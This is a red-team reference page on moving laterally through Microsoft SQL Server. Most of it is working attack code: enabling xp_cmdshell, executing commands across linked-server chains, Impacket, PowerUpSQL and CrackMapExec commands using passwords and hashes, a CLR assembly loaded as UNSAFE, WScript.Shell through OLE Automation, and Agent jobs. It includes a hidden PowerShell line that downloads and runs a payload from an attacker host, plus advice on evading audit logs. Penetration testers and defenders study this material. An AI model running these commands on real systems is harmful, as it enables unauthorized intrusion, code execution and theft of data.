# MSSQL Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1021 - Remote Services
> **Platforms**: Windows (SQL Server)
> **Required Privileges**: SA or sysadmin role on SQL Server
> **OPSEC Risk**: Medium

## Strategic Overview

Microsoft SQL Server is ubiquitous in enterprise environments and represents an often-overlooked lateral movement vector. SQL Servers frequently run with elevated privileges (Local SYSTEM or domain service accounts), making them high-value pivot points. The most powerful feature for lateral movement is SQL Server linked servers -- trust relationships between SQL instances that allow query execution across server boundaries. Linked server chains can traverse network segments and trust boundaries that would otherwise block traditional lateral movement. Beyond linked servers, SQL Server provides multiple code execution mechanisms: xp_cmdshell for OS commands, CLR assemblies for .NET code execution, OLE Automation procedures for COM object instantiation, and SQL Server Agent jobs for scheduled execution. A red team lead should view every SQL Server as both a credential store (connection strings in web applications) and a lateral movement relay (via linked servers and service account privileges).

### Why SQL Servers Are High-Value Targets

- Often run as high-privilege domain service accounts (svc_sql, sql_admin)
- Linked server chains traverse network boundaries
- Store sensitive data (credentials, PII, business data)
- Web applications store connection strings that provide SQL access
- DBAs often have domain admin or equivalent privileges

## Technical Deep-Dive

### 1. xp_cmdshell -- OS Command Execution

```sql
-- Check if xp_cmdshell is enabled
EXEC sp_configure 'show advanced options';
-- If xp_cmdshell value = 0, enable it:

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user /domain';

-- Download and execute payload
EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/payload.ps1'')"';

-- Disable after use (OPSEC)
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
```

### 2. Linked Server Discovery and Exploitation

```sql
-- Discover linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;

-- Check current user context on linked server
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT USER');

-- Execute commands on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Enable xp_cmdshell on linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Crawl linked server chains (nested OPENQUERY for multi-hop)
-- Server A → Server B → Server C
SELECT * FROM OPENQUERY([SERVER_B], '
    SELECT * FROM OPENQUERY([SERVER_C], ''SELECT SYSTEM_USER'')
');

-- Execute command on Server C through Server B
SELECT * FROM OPENQUERY([SERVER_B], '
    SELECT * FROM OPENQUERY([SERVER_C], ''EXEC xp_cmdshell ''''whoami'''''')
');

-- Note: Each hop doubles the quote escaping requirement
-- Triple-hop example (A → B → C → D):
SELECT * FROM OPENQUERY([B], '
    SELECT * FROM OPENQUERY([C], ''
        SELECT * FROM OPENQUERY([D], ''''SELECT SYSTEM_USER'''')
    '')
');
```

### 3. Impacket mssqlclient.py

```bash
# Connect with Windows authentication
mssqlclient.py corp.local/user:'P@ssw0rd'@sql01.corp.local -windows-auth

# Connect with SQL authentication
mssqlclient.py sa:'SAPassword123'@sql01.corp.local

# With NTLM hash
mssqlclient.py corp.local/user@sql01.corp.local -hashes :HASH -windows-auth

# With Kerberos
export KRB5CCNAME=user.ccache
mssqlclient.py corp.local/user@sql01.corp.local -k -no-pass -windows-auth

# Once connected, interactive commands:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> enum_links
SQL> use_link LINKED_SERVER
SQL> xp_cmdshell whoami  # Now executing on linked server
```

### 4. PowerUpSQL (PowerShell SQL Toolkit)

```powershell
# Import PowerUpSQL
Import-Module .\PowerUpSQL.ps1

# Discover SQL instances in the domain
Get-SQLInstanceDomain | Get-SQLServerInfo

# Discover SQL instances via SPN scanning
Get-SQLInstanceDomain -Verbose

# Check access on discovered instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Enumerate linked servers across all accessible instances
Get-SQLInstanceDomain | Get-SQLServerLink

# Crawl linked server chains automatically
Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose

# Execute OS commands
Invoke-SQLOSCmd -Instance sql01.corp.local -Command "whoami" -Verbose

# Execute on linked server
Get-SQLServerLinkCrawl -Instance sql01.corp.local -Query "EXEC xp_cmdshell 'whoami'"

# Audit SQL instances for vulnerabilities
Invoke-SQLAudit -Instance sql01.corp.local -Verbose

# Find sensitive data
Get-SQLColumnSampleDataThreaded -Instance sql01.corp.local -Keywords "password,credit,ssn" -SampleSize 5
```

### 5. CrackMapExec / NetExec MSSQL Module

```bash
# Authenticate and execute commands via MSSQL
crackmapexec mssql sql01.corp.local -u user -p 'P@ssw0rd' -d corp.local -x "whoami"

# With hash
crackmapexec mssql sql01.corp.local -u user -H HASH -d corp.local -x "whoami"

# SQL authentication (not Windows auth)
crackmapexec mssql sql01.corp.local -u sa -p 'SAPassword' --local-auth -x "whoami"

# Enumerate MSSQL instances across subnet
crackmapexec mssql 192.168.1.0/24 -u user -p 'P@ssw0rd' -d corp.local

# Execute queries
crackmapexec mssql sql01.corp.local -u user -p 'P@ssw0rd' -d corp.local -q "SELECT name FROM sys.databases"
```

### 6. CLR Assembly -- Custom .NET Code Execution

```sql
-- CLR assemblies allow arbitrary .NET code execution within SQL Server
-- Step 1: Enable CLR integration
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Step 2: Set database to TRUSTWORTHY (required for UNSAFE assemblies)
ALTER DATABASE master SET TRUSTWORTHY ON;

-- Step 3: Create assembly from hex bytes (no file drop needed)
CREATE ASSEMBLY [CustomAssembly]
AUTHORIZATION [dbo]
FROM 0x4D5A90000300000004000000... -- Hex-encoded .NET DLL
WITH PERMISSION_SET = UNSAFE;

-- Step 4: Create stored procedure from assembly
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [CustomAssembly].[StoredProcedures].[cmd_exec];

-- Step 5: Execute
EXEC cmd_exec 'whoami';

-- Cleanup
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY CustomAssembly;
ALTER DATABASE master SET TRUSTWORTHY OFF;
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;
```

### 7. OLE Automation Procedures

```sql
-- OLE Automation allows COM object instantiation from SQL
-- Enable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute commands via WScript.Shell
DECLARE @output INT;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', @output OUTPUT, 'cmd.exe /c whoami > C:\temp\out.txt', 0, 1;
EXEC sp_OADestroy @shell;

-- Disable after use
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;
```

### 8. SQL Server Agent Jobs

```sql
-- SQL Server Agent allows scheduled job execution (if Agent service is running)
USE msdb;

-- Create a job
EXEC dbo.sp_add_job @job_name = N'SystemCheck';

-- Add a job step with OS command execution
EXEC sp_add_jobstep @job_name = N'SystemCheck',
    @step_name = N'RunCommand',
    @subsystem = N'CmdExec',
    @command = N'whoami > C:\temp\agent_out.txt',
    @retry_attempts = 0,
    @retry_interval = 0;

-- Add schedule to run immediately
EXEC dbo.sp_add_jobserver @job_name = N'SystemCheck';

-- Start the job
EXEC dbo.sp_start_job @job_name = N'SystemCheck';

-- Cleanup
EXEC dbo.sp_delete_job @job_name = N'SystemCheck';
```

## Detection & Evasion

### Detection Indicators

- SQL Server error logs showing xp_cmdshell enablement and usage
- **Event ID 15457** (SQL Server Audit: sp_configure changed) for configuration changes
- Process creation from sqlservr.exe as parent (xp_cmdshell indicator)
- CLR assembly loading events in SQL Server logs
- Linked server queries crossing security boundaries
- SQL Server Agent job creation from non-DBA accounts
- Network connections from SQL Server to unexpected destinations

### Evasion Techniques

- Disable xp_cmdshell immediately after use and restore original configuration
- Use CLR assemblies over xp_cmdshell -- CLR is a more legitimate feature and produces fewer obvious artifacts
- Execute through linked server chains to obscure the source of commands
- Use SQL Server Agent jobs during maintenance windows when scheduled tasks are expected
- Prefer OLE Automation for one-off commands where CLR assembly setup is excessive
- Avoid modifying sa password or adding new SQL logins (obvious in audit logs)
- Time SQL-based lateral movement during business hours when database activity is high

## Cross-References

- [[ntlm-relay-lateral]] - Relay NTLM to MSSQL for unauthenticated command execution
- [[pass-the-hash]] - PtH to SQL Server using Windows authentication
- Section 06: Credential Access - Connection string extraction from web applications
- Section 04: Discovery - SQL Server instance enumeration via SPN scanning
- Section 08: Privilege Escalation - SQL Server to OS-level privilege escalation

## References

- https://attack.mitre.org/techniques/T1021/
- https://github.com/NetSPI/PowerUpSQL
- https://www.thehacker.recipes/ad/movement/mssql
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://www.netspi.com/blog/technical-blog/network-penetration-testing/sql-server-link-crawling-powerupsql/
